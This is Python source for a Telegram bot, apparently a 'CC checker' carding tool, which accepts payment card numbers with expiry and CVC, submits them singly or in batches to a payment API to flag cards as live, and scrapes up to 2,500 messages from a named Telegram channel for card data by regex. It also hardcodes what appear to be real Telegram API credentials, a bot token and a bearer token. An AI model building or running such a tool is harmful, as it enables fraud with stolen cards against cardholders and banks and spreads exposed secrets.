from telethon import TelegramClient, events
import re
import time
import requests
from datetime import datetime

# Replace with your own API ID, hash, and bot token
api_id = '29400566'
api_hash = '8fd30dc496aea7c14cf675f59b74ec6f'
bot_token = '8036013708:AAGi7Px-PubjvKn4U_kJQA3T85iYKQdldlo'

# Initialize the client
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Regular expression to match card details in the format `number|exp_month|exp_year|cvc`
card_pattern = re.compile(r"\b(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})\b")

# Function to check a card using the specified API token
def check_card_api(card_number, exp_month, exp_year, cvc):
    try:
        url = "https://api.paymentprovider.com/validate"  # Assuming endpoint
        headers = {"Authorization": "Bearer 896d15c1-2f42-4e5f-ab5c-dbf7ffdf137f"}
        data = {
            "card_number": card_number,
            "exp_month": exp_month,
            "exp_year": exp_year,
            "cvc": cvc,
        }
        response = requests.post(url, headers=headers, json=data)
        
        if response.status_code == 200:
            result = response.json()
            if result.get("status") == "approved":
                return True, "CVV LIVE"
            else:
                return False, "Declined"
        else:
            return False, f"Error: {response.json().get('message', 'Unknown error')}"
    except Exception as e:
        return False, str(e)

# Simulated card information response format
def generate_response(card_number, exp_month, exp_year, cvc, approval_status, response_message=""):
    card_info = "VISA - CREDIT - PLATFORM"  # Example card info
    issuer = "CTBC BANK CO., LTD. 🏛"  # Example issuer
    country = "TAIWAN - 🇹🇼"  # Example country
    gateway = "Payment API"  # Custom gateway description
    checked_by = "Fʟᴀsʜ 🝮︎︎︎︎︎︎︎ Sʜɪɴᴇ [ Owner ]"
    time_taken = round(time.time() % 60, 2)  # Simulated time for demo
    time_checked = datetime.now().strftime("%H:%M:%S")

    approval_text = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" if approval_status else "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"

    return f"""{approval_text}

𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: {gateway}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {response_message}

𝗜𝗻𝗳𝗼: {card_info}
𝗜𝘀𝘀𝘂𝗲𝗿: {issuer}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

𝗧𝗶𝗺𝗲: {time_taken} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {checked_by}"""

@client.on(events.NewMessage(pattern='/chk1'))
async def chk1(event):
    await event.reply("Please send the card details in this format:\n\n`card_number|exp_month|exp_year|cvc`")

@client.on(events.NewMessage(pattern='/chk2'))
async def chk2(event):
    await event.reply("Please send the list of card details. Each card should be on a new line in this format:\n\n`card_number|exp_month|exp_year|cvc`")

@client.on(events.NewMessage)
async def card_check_handler(event):
    text = event.raw_text.strip()
    
    # Single card check if initiated with /chk1
    if text.startswith("/chk1"):
        card_data = text.split()[-1]
        if "|" in card_data:
            card_number, exp_month, exp_year, cvc = card_data.split('|')
            approval_status, response_message = check_card_api(card_number, exp_month, exp_year, cvc)
            response = generate_response(card_number, exp_month, exp_year, cvc, approval_status, response_message)
            await event.reply(response)
        else:
            await event.reply("Invalid card format. Please use `card_number|exp_month|exp_year|cvc`.")

    # Mass card check if initiated with /chk2
    elif text.startswith("/chk2"):
        lines = text.splitlines()[1:]  # Remove the /chk2 command line
        results = []
        
        if len(lines) > 30:
            await event.reply("❌ Please limit to 30 card numbers for the mass check.")
            return

        for line in lines:
            card_data = line.strip()
            if "|" in card_data:
                try:
                    card_number, exp_month, exp_year, cvc = card_data.split('|')
                    approval_status, response_message = check_card_api(card_number, exp_month, exp_year, cvc)
                    response = generate_response(card_number, exp_month, exp_year, cvc, approval_status, response_message)
                    results.append(response)
                except ValueError:
                    results.append("❌ Invalid format for line: " + line)
            else:
                results.append("❌ Invalid format for line: " + line)
        
        # Send results in batches
        batch_size = 5
        for i in range(0, len(results), batch_size):
            batch = "\n\n".join(results[i:i + batch_size])
            await event.reply(batch)

@client.on(events.NewMessage(pattern='/scr'))
async def scrape_cards(event):
    command = event.raw_text.split()
    if len(command) < 2:
        await event.reply("Please specify a channel name, e.g., `/scr @channelname`")
        return
    
    channel_name = command[1]
    try:
        scraped_cards = []
        async for message in client.iter_messages(channel_name, limit=2500):
            if message.text:
                cards = card_pattern.findall(message.text)
                if cards:
                    scraped_cards.extend(["|".join(card) for card in cards])

        if scraped_cards:
            batch_size = 50
            for i in range(0, len(scraped_cards), batch_size):
                batch = "\n".join(scraped_cards[i:i + batch_size])
                await event.reply(f"Scraped cards from {channel_name}:\n\n{batch}")
        else:
            await event.reply(f"No cards found in the channel {channel_name}.")

    except Exception as e:
        await event.reply(f"Error accessing channel {channel_name}: {str(e)}")

# Start the bot
client.start()
client.run_until_disconnected()
                         
